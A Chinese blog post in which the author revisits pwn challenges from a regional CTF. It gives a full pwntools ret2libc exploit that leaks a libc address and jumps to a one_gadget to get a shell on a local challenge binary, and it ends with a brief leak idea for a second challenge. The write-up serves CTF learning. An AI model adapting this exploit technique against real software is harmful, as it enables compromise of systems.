---
title: 铁三福建赛区pwn回顾
author: nepire
avatar: https://wx1.sinaimg.cn/large/006bYVyvgy1ftand2qurdj303c03cdfv.jpg
authorLink: https://nepire.github.io/
authorAbout: 逐梦者
authorDesc: 逐梦者
categories: 技术
comments: true
tags:
keywords:
description:
photos:
---

建了新博客开始还是写点东西存着，不然空空的感觉也不是很好，刚好看到文涛学长给我的铁三PWN题，当时我连涛神写的exp都看不懂，现在看看自己当初真的太菜了，所以现在重新看一遍题目来检验现在的实力





## ROP


### 思路

简单看了一遍程序，vuln函数明显的栈溢出，利用空间贼大，checksec检测下只开了NX，
直接ret2libc做ROP来getshell
### exp
```python
from pwn import*
context(os='linux',arch='i386',log_level='debug')
n = process('./rop')
elf = ELF('./rop')
libc = ELF('/lib/i386-linux-gnu/libc.so.6')
#libc = ELF('./libc32')

buf = 'a'*0x88
vuln_addr = 0x08048474
write_got = elf.got['write']
write_plt = elf.plt['write']
write_sym = libc.symbols['write']
bin_sh = libc.search('/bin/sh').next()
system_sym = libc.symbols['system']

leak = buf+'aaaa'+ p32(write_plt) +p32(vuln_addr)+ p32(1) + p32(write_got) + p32(0x4)
n.sendline(leak)
write_addr = u32(n.recv())
print hex(write_addr)

libc_base = write_addr - write_sym
system_addr = libc_base + system_sym
#one_gadget = 0x3a80c
one_gadget = 0x3ac5c + libc_base
payload = buf+ 'aaaa' + p32(one_gadget)
n.sendline(payload)

n.interactive()
```


## breakfast

### 思路

简单的审一遍代码发现

![nepire](https://raw.githubusercontent.com/Nepire/Nepire.github.io/master/images/20180916113547.jpg)

write正常应该是输出ptr[idx]，这里很突兀的就输出了ptr[idx]所指向地址的内容，所以往ptr[idx]里写入write的got地址来获得实际地址来计算libc_base
